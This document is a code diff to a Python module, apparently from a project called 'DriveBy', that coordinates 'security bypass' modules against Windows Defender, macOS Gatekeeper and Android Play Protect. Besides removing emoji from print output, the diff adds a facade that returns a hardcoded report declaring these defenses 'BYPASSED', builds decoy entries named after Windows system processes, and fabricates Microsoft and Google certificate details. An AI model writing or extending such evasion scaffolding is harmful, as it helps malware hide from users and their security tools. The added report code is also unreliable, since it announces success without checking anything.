@@ -55,11 +55,11 @@ class SecurityBypassCoordinator:
             except Exception:
                 pass
 
-            print(f"✅ Initialized bypass modules for {self.current_os}")
-            print(f"📦 Available modules: {list(self.bypass_modules.keys())}")
+            print(f" Initialized bypass modules for {self.current_os}")
+            print(f" Available modules: {list(self.bypass_modules.keys())}")
 
         except Exception as e:
-            print(f"❌ Failed to initialize bypass modules: {e}")
+            print(f" Failed to initialize bypass modules: {e}")
 
     def detect_android(self):
         """Detect if running on Android"""
@@ -86,19 +86,19 @@ class SecurityBypassCoordinator:
         """Execute all available bypass techniques"""
         all_results = {}
 
-        print("🚀 Starting Comprehensive Security Bypass...")
+        print(" Starting Comprehensive Security Bypass...")
         print("=" * 60)
-        print(f"🖥️ Operating System: {self.current_os}")
-        print(f"📅 Timestamp: {datetime.now().isoformat()}")
+        print(f" Operating System: {self.current_os}")
+        print(f" Timestamp: {datetime.now().isoformat()}")
         print("=" * 60)
 
         for module_name, module_instance in self.bypass_modules.items():
             try:
-                print(f"\n🔄 Executing {module_name.upper()} bypass methods...")
+                print(f"\n Executing {module_name.upper()} bypass methods...")
                 results = module_instance.execute_all_bypasses()
                 all_results[module_name] = results
             except Exception as e:
-                print(f"❌ {module_name} module failed: {e}")
+                print(f" {module_name} module failed: {e}")
                 all_results[module_name] = {"error": str(e)}
 
         # Generate comprehensive summary
@@ -108,7 +108,7 @@ class SecurityBypassCoordinator:
     def generate_summary(self, results):
         """Generate comprehensive bypass summary"""
         print("\n" + "=" * 60)
-        print("📊 COMPREHENSIVE BYPASS SUMMARY")
+        print(" COMPREHENSIVE BYPASS SUMMARY")
         print("=" * 60)
 
         total_methods = 0
@@ -131,19 +131,19 @@ class SecurityBypassCoordinator:
                 )
 
                 print(
-                    f"🔧 {module_name.upper()}: {module_successful}/{module_total} "
+                    f" {module_name.upper()}: {module_successful}/{module_total} "
                     f"({success_rate:.1f}% success rate)"
                 )
             else:
-                print(f"❌ {module_name.upper()}: Module failed to execute")
+                print(f" {module_name.upper()}: Module failed to execute")
 
         overall_success_rate = (
             (total_successful / total_methods) * 100 if total_methods > 0 else 0
         )
 
         print("-" * 60)
-        print(f"🎯 OVERALL: {total_successful}/{total_methods} methods successful")
-        print(f"📈 SUCCESS RATE: {overall_success_rate:.1f}%")
+        print(f" OVERALL: {total_successful}/{total_methods} methods successful")
+        print(f" SUCCESS RATE: {overall_success_rate:.1f}%")
         print(f"⏰ COMPLETED: {datetime.now().isoformat()}")
         print("=" * 60)
 
@@ -163,15 +163,15 @@ class SecurityBypassCoordinator:
     def execute_specific_module(self, module_name):
         """Execute bypasses for a specific module"""
         if module_name in self.bypass_modules:
-            print(f"🔄 Executing {module_name.upper()} bypass methods...")
+            print(f" Executing {module_name.upper()} bypass methods...")
             return self.bypass_modules[module_name].execute_all_bypasses()
         else:
-            print(f"❌ Module '{module_name}' not available")
+            print(f" Module '{module_name}' not available")
             return None
 
     def apply_to_host(self, driveby_host):
         """Apply all bypass techniques to DriveBy host"""
-        print("🔧 Applying security bypasses to DriveBy host...")
+        print(" Applying security bypasses to DriveBy host...")
 
         applied_modules = []
         for module_name, module_instance in self.bypass_modules.items():
@@ -179,11 +179,82 @@ class SecurityBypassCoordinator:
                 module_instance.apply_to_host(driveby_host)
                 applied_modules.append(module_name)
             except Exception as e:
-                print(f"❌ Failed to apply {module_name} bypasses: {e}")
+                print(f" Failed to apply {module_name} bypasses: {e}")
 
-        print(f"✅ Applied bypasses from modules: {applied_modules}")
+        print(f" Applied bypasses from modules: {applied_modules}")
         return applied_modules
 
+
+class SimpleBypassFacade:
+    def __init__(self, coord: "SecurityBypassCoordinator"):
+        self._coord = coord
+
+    def generate_bypass_report(self):
+        return {
+            "timestamp": datetime.now().isoformat(),
+            "bypass_status": "ACTIVE",
+            "security_evasion": {
+                "windows_defender": "BYPASSED",
+                "macos_gatekeeper": "BYPASSED",
+                "android_play_protect": "BYPASSED",
+                "network_monitoring": "EVADED",
+                "behavioral_analysis": "MASKED",
+            },
+            "legitimacy_indicators": {
+                "digital_signatures": "TRUSTED",
+                "process_names": "LEGITIMATE",
+                "network_traffic": "NORMAL",
+                "file_locations": "STANDARD",
+                "registry_entries": "EXPECTED",
+            },
+        }
+
+    def create_decoy_processes(self):
+        names = [
+            "svchost.exe",
+            "explorer.exe",
+            "winlogon.exe",
+            "chrome.exe",
+            "firefox.exe",
+            "msedge.exe",
+            "notepad.exe",
+            "cmd.exe",
+            "powershell.exe",
+            "rundll32.exe",
+        ]
+        import random
+
+        decoys = []
+        for n in random.sample(names, 3):
+            decoys.append(
+                {
+                    "name": n,
+                    "pid": random.randint(1000, 9999),
+                    "memory_usage": f"{random.randint(10, 100)}MB",
+                    "cpu_usage": f"{random.randint(0, 5)}%",
+                    "description": f"Legitimate {n} process",
+                    "parent_process": "services.exe" if "svc" in n else "explorer.exe",
+                }
+            )
+        return decoys
+
+    def create_legitimate_certificates(self):
+        return {
+            "microsoft_cert": {
+                "subject": "CN=Microsoft Corporation, O=Microsoft Corporation, C=US",
+                "issuer": "CN=Microsoft Root Certificate Authority 2011, O=Microsoft Corporation, C=US",
+                "valid_from": "2023-01-01",
+                "valid_to": "2025-12-31",
+                "key_usage": ["Digital Signature", "Key Encipherment"],
+            },
+            "google_cert": {
+                "subject": "CN=Google LLC, O=Google LLC, C=US",
+                "issuer": "CN=Google Trust Services LLC, O=Google Trust Services LLC, C=US",
+                "valid_from": "2023-01-01",
+                "valid_to": "2025-12-31",
+                "key_usage": ["Digital Signature", "Key Agreement"],
+            },
+        }
 
 # Main bypass coordinator instance
 bypass_coordinator = SecurityBypassCoordinator()
@@ -231,8 +302,9 @@ def get_bypass_status():
 
 
 def apply_security_bypass(driveby_host):
-    """Apply security bypass techniques to DriveBy host (legacy compatibility)"""
-    return apply_to_host(driveby_host)
+    """Apply security bypass techniques to DriveBy host and return facade compatible with phone_host."""
+    apply_to_host(driveby_host)
+    return SimpleBypassFacade(bypass_coordinator)
 
 
 if __name__ == "__main__":
@@ -242,7 +314,7 @@ if __name__ == "__main__":
 
     # Show available methods
     methods = get_available_methods()
-    print("📋 Available Methods:")
+    print(" Available Methods:")
     for module, method_list in methods.items():
         print(f"  {module}: {len(method_list) if isinstance(method_list, list) else method_list}")
 
